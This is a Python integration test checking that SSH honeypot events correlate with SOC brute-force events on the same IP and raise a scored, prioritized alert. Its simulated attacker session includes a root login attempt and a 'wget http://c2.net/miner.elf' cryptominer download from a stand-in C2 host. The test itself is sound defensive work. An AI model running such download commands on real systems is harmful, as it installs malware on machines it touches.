"""
Integration test: Honeypot module integration with SOC Correlation & Scoring.

Validates that deceptive honeypot events (source: "honeypot") flow through the
SOC correlation engine, group with production SOC events on matching entities (IP),
and trigger the Multi-Source Correlation bonus in the Risk Scoring calculator.
"""

from __future__ import annotations

import datetime

import pytest

from src.honeypot.models import CommandRecord, FileArtifact, HoneypotSession
from src.honeypot.normalizer import (
    normalise_artifact_record,
    normalise_command_record,
    normalise_session_to_event,
)
from src.honeypot.server import DeceptionService
from src.shared.event_schema import Entity, SecurityEvent
from src.soc.alerting.manager import AlertManager
from src.soc.correlation.engine import CorrelationEngine
from src.soc.detection.rule_model import RuleMatch
from src.soc.scoring.calculator import MULTI_SOURCE_BONUS, score_incident


def test_honeypot_soc_cross_modal_correlation():
    """
    Scenario:
    1. Attacker (203.0.113.88) attempts brute force on production server (SOC syslog event).
    2. Attacker pivots to scan deceptive SSH honeypot on same network.
    3. Attacker runs recon and downloads a payload in honeypot.
    4. Correlation engine links both sources into ONE incident.
    5. Scoring calculator awards MULTI_SOURCE_BONUS (+5.0).
    6. Alert manager generates a prioritized cross-modal alert.
    """
    engine = CorrelationEngine(correlation_window_seconds=300)
    alert_mgr = AlertManager(min_score_to_alert=20.0)
    now = datetime.datetime.now(datetime.timezone.utc)
    attacker_ip = "203.0.113.88"

    # ------------------------------------------------------------------
    # Step 1: Production SOC Event (Brute force on prod server)
    # ------------------------------------------------------------------
    soc_event = SecurityEvent(
        event_type="auth_failure",
        source="soc",
        severity="high",
        timestamp=now,
        entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
        raw={"service": "sshd", "line": "Failed password for root from 203.0.113.88"},
    )
    rule_match = RuleMatch(
        rule_id="SOC-RULE-001",
        rule_title="SSH Brute Force Attempts",
        severity="high",
        matched_event_ids=[soc_event.event_id],
        entity=soc_event.entity,
        tags=["attack.t1110"],
        context={"mitre_attack": ["T1110"]},
    )
    inc = engine.process_event(soc_event, rule_matches=[rule_match])
    assert inc is not None
    assert inc.event_count == 1
    assert inc.timeline[0].source == "soc"

    # ------------------------------------------------------------------
    # Step 2: Honeypot Deceptive Interaction
    # ------------------------------------------------------------------
    deception = DeceptionService(target_host="honeypot-ssh-01")
    session = deception.handle_connection(
        source_ip=attacker_ip,
        source_port=52341,
        protocol="ssh",
    )
    deception.handle_auth(session.session_id, "root", "rootpass123", allow_login=True)
    deception.handle_command(session.session_id, "uname -a")
    deception.handle_command(session.session_id, "wget http://c2.net/miner.elf")
    closed_session = deception.handle_disconnect(session.session_id)
    assert closed_session is not None

    # Normalise honeypot interaction to SecurityEvents
    hp_cmd_event = normalise_command_record(
        closed_session,
        closed_session.commands[0],
    )
    hp_download_event = normalise_artifact_record(
        closed_session,
        closed_session.artifacts[0],
    )
    hp_session_event = normalise_session_to_event(closed_session)

    # ------------------------------------------------------------------
    # Step 3: Correlate Honeypot Events into SOC Incident
    # ------------------------------------------------------------------
    engine.process_event(hp_cmd_event)
    engine.process_event(hp_download_event)
    correlated_inc = engine.process_event(hp_session_event)

    assert correlated_inc is not None
    # All 4 events (1 SOC + 3 Honeypot) must be in the same incident
    assert correlated_inc.event_count == 4
    assert correlated_inc.primary_entity.ip == attacker_ip

    # Sources in timeline must include both 'soc' and 'honeypot'
    sources_in_timeline = {t.source for t in correlated_inc.timeline}
    assert "soc" in sources_in_timeline
    assert "honeypot" in sources_in_timeline

    # ------------------------------------------------------------------
    # Step 4: Verify Multi-Source Risk Scoring
    # ------------------------------------------------------------------
    score, breakdown = score_incident(correlated_inc)
    assert breakdown.multi_source_bonus == MULTI_SOURCE_BONUS
    assert sorted(breakdown.sources_seen) == ["honeypot", "soc"]
    assert score >= 75.0  # Critical/high cross-modal attack

    explanation = breakdown.explain()
    assert "Multi-source correlation (honeypot, soc)" in explanation

    # ------------------------------------------------------------------
    # Step 5: Verify Alert Manager Output
    # ------------------------------------------------------------------
    alert = alert_mgr.process_incident(correlated_inc)
    assert alert is not None
    assert alert.priority in ("P1-critical", "P2-high")
    assert alert.event_count == 4
    assert alert.score_breakdown["multi_source"]["value"] == MULTI_SOURCE_BONUS
